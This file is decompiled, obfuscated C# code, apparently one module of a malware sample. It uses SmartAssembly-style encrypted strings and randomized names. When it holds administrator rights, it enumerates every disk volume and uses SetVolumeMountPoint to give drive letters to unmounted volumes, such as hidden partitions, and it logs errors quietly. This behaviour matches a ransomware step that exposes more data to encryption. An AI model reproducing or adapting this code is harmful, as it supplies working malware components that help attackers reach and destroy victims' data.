using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace bpbWYHKNCNX;

public static class UnbQkIgWNdhxuG
{
	public enum vsNBKtEBRZchnqC : uint
	{
		TjjakDnCrLESna,
		AKbANbdIUtX,
		IjfKCUTEbH,
		cjtLuXDdsmeFS,
		tUtfRWUBfBSZ,
		jaaUOuKSBifi,
		mGcJdNlhishB
	}

	private sealed class RuxHbRTjpZYf
	{
		public uint GSQJoKKqywvhJ;

		public uint VvCKuLkVOwAQ;

		public char[] VVkSQLUjYaZYccH;

		public bool _003CMountVolumes_003Eb__0(string string_0)
		{
			if (GetVolumePathNamesForVolumeNameW(string_0, VVkSQLUjYaZYccH, VvCKuLkVOwAQ, ref GSQJoKKqywvhJ))
			{
				return VVkSQLUjYaZYccH.Length != 3;
			}
			return true;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	public static extern vsNBKtEBRZchnqC GetDriveType([MarshalAs(UnmanagedType.LPStr)] string ELvsAnrPPerO);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetVolumePathNamesForVolumeNameW(string LUWiyyqifia, char[] MHhyCnCUFzM, uint JjZFyTvzLNSn, ref uint IzKOpxfZYtw);

	[DllImport("kernel32.dll")]
	internal static extern bool SetVolumeMountPoint(string string_0, string string_1);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern int FindFirstVolume(StringBuilder stringBuilder_0, int int_0);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern bool FindNextVolume(int int_0, StringBuilder stringBuilder_0, int int_1);

	public static List<string> BOcTYLegaAHYJ()
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		List<string> list = new List<string>();
		int int_ = FindFirstVolume(stringBuilder, 1024);
		do
		{
			list.Add(stringBuilder.ToString());
			Console.WriteLine(stringBuilder.ToString());
		}
		while (FindNextVolume(int_, stringBuilder, 1024));
		return list;
	}

	public static void kDSSvpMJEHKWrq()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		try
		{
			RuxHbRTjpZYf CS_0024_003C_003E8__locals0 = new RuxHbRTjpZYf();
			string[] array = new string[26]
			{
				getString_0(107403010),
				getString_0(107403005),
				getString_0(107403000),
				getString_0(107403475),
				getString_0(107403470),
				getString_0(107403465),
				getString_0(107403460),
				getString_0(107403487),
				getString_0(107403482),
				getString_0(107403477),
				getString_0(107403440),
				getString_0(107403435),
				getString_0(107403430),
				getString_0(107403457),
				getString_0(107403452),
				getString_0(107403447),
				getString_0(107403410),
				getString_0(107403405),
				getString_0(107403400),
				getString_0(107403427),
				getString_0(107403422),
				getString_0(107403417),
				getString_0(107403412),
				getString_0(107403375),
				getString_0(107403370),
				getString_0(107403365)
			};
			string[] array2 = new string[array.Length];
			int num = 0;
			string[] array3 = array;
			foreach (string text in array3)
			{
				if (GetDriveType(text) == vsNBKtEBRZchnqC.AKbANbdIUtX)
				{
					array2[num++] = text;
				}
			}
			List<string> source = BOcTYLegaAHYJ();
			CS_0024_003C_003E8__locals0.GSQJoKKqywvhJ = 0u;
			CS_0024_003C_003E8__locals0.VvCKuLkVOwAQ = 120u;
			CS_0024_003C_003E8__locals0.VVkSQLUjYaZYccH = new char[260];
			foreach (string item in source.Where((string string_0) => !GetVolumePathNamesForVolumeNameW(string_0, CS_0024_003C_003E8__locals0.VVkSQLUjYaZYccH, CS_0024_003C_003E8__locals0.VvCKuLkVOwAQ, ref CS_0024_003C_003E8__locals0.GSQJoKKqywvhJ) || CS_0024_003C_003E8__locals0.VVkSQLUjYaZYccH.Length != 3))
			{
				SetVolumeMountPoint(array2[num--], item);
				if (xWcMxnuhDQYJl.DolWpTQIcvjTgATJ)
				{
					try
					{
						Console.WriteLine(getString_0(107403392), array2[num--]);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (xWcMxnuhDQYJl.fvDSfFEVAaG)
			{
				try
				{
					File.AppendAllText(xWcMxnuhDQYJl.qiQAhhXEbdwvY, getString_0(107403335) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static UnbQkIgWNdhxuG()
	{
		Strings.CreateGetStringDelegate(typeof(UnbQkIgWNdhxuG));
	}
}
